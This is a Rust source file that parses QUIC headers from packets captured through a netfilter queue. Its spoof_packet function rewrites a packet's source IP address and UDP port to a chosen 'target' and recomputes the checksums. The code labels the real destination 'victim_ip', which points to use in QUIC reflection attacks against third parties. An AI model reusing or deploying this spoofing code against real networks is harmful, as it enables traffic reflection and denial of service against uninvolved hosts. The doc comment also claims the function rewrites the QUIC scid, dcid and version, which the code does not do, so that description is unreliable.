use std::io;
use std::net::{IpAddr, SocketAddr};

use pnet::packet::{FromPacket, PacketSize};
use pnet_macros::Packet;
use pnet_macros_support::types::*;
use bytes::BytesMut;
use log::info;
use nfq::Message;
use pnet::packet::{
    ipv4::{Ipv4Packet, checksum, MutableIpv4Packet},
    ipv6::{Ipv6Packet, MutableIpv6Packet},
    udp::{ipv4_checksum, ipv6_checksum, MutableUdpPacket, UdpPacket},
    MutablePacket, Packet,
};
use color_eyre::eyre::{eyre, Result, WrapErr};

/// Extract QUIC header from an ethernet packet.
pub fn quic_header_from_ethernet<'a>(packet: &'a Message) -> Result<QuicLongHeader> {
    let ether_type = packet.get_hw_protocol();

    match ether_type {
        // IPv4
        0x0800 => {
            let ip_packet =
                Ipv4Packet::new(packet.get_payload()).ok_or(eyre!("Invalid IPv4 packet."))?;
            let udp_packet =
                UdpPacket::new(ip_packet.payload()).ok_or(eyre!("Invalid Udp packet."))?;

            extract_quic_header(udp_packet.payload())
        }
        // IPv6
        0x86dd => {
            let ip_packet =
                Ipv6Packet::new(packet.get_payload()).ok_or(eyre!("Invalid IPv6 packet."))?;
            let udp_packet =
                UdpPacket::new(ip_packet.payload()).ok_or(eyre!("Invalid Udp packet."))?;

            extract_quic_header(udp_packet.payload())
        }
        _ => {
            unimplemented!()
        }
    }
}

/// Decode non-necrypted parts of a quick packet.
pub fn extract_quic_header(packet: &[u8]) -> Result<QuicLongHeader> {
    let mut buf = io::Cursor::new(BytesMut::from(packet));

    let packet = QuicLongHeaderPacket::new(packet).ok_or(eyre!("Invalid Quic Packet"));

    packet.map(|p| p.from_packet())

}

#[derive(Packet, Debug)]
pub struct QuicLongHeader {
    pub header_form: u1,
    pub fixed_bit: u1,
    pub long_packet_type: u2,
    pub type_specific_bits: u4,
    pub version: u32be,
    pub dcid_len: u8,
    #[length = "dcid_len"]
    pub dcid: Vec<u8>,
    pub scid_len: u8,
    #[length = "scid_len"]
    pub scid: Vec<u8>,
    #[payload]
    pub payload: Vec<u8>,
}

/// Decode a version negotiate packet.
///
/// Returns the decoded header and the supported versions of the server (in the payload).
/// Errors for invalid QUIC packets and if the QUIC packet is not a version negotiation.
pub fn parse_version_negotiate(packet: &[u8]) -> Result<QuicLongHeader> {
    let packet = QuicLongHeaderPacket::new(packet)
        .ok_or(eyre!("Invalid QUIC packet"))?
        .from_packet();

    if packet.version != 0 {
        return Err(eyre!("Not a Version Negotiation Packet."));
    }

    Ok(packet)
}

/// Spoof initial packet
///
/// Overwrites:
/// - source address and port in the IP/UDP packet in payload
/// - scid, dcid and version in QUIC packet
///
/// # Arguments
///
/// * `packet` - IP packet to be spoofed
/// * `target_addr` - Spoofed source address/port
///
/// Packet is assumed to be IPv4/IPv6 according to [`target_addr`]
pub fn spoof_packet(packet: &mut [u8], target_addr: SocketAddr) -> Result<()> {
    let target_ip = target_addr.ip();
    let target_port = target_addr.port();

    match target_ip {
        IpAddr::V4(target_ip) => {
            let mut ip_packet = MutableIpv4Packet::new(packet)
                .ok_or(eyre!("Invalid IPv4 packet."))?;
            ip_packet.set_source(target_ip);

            let victim_ip = ip_packet.get_destination();

            let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut())
                .ok_or(eyre!("Invalid UDP packet."))?;

            udp_packet.set_source(target_port);

            // Recalculate udp packet checksum
            let updated_udp_checksum =
                ipv4_checksum(&udp_packet.to_immutable(), &target_ip, &victim_ip);
            udp_packet.set_checksum(updated_udp_checksum);

            // Recalculate ipv4 packet checksum
            let updated_ip_checksum = checksum(&ip_packet.to_immutable());
            ip_packet.set_checksum(updated_ip_checksum);
        }
        IpAddr::V6(target_ip) => {
            let mut ip_packet = MutableIpv6Packet::new(packet)
                .ok_or(eyre!("Invalid IPv6 packet."))?;

            ip_packet.set_source(target_ip);

            let victim_ip = ip_packet.get_destination();

            let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut())
                .ok_or(eyre!("Not an UDP packet."))?;

            udp_packet.set_source(target_port);

            // Recalculate udp packet checksum
            let updated_checksum =
                ipv6_checksum(&udp_packet.to_immutable(), &target_ip, &victim_ip);
            udp_packet.set_checksum(updated_checksum);
        }
    }

    Ok(())
}
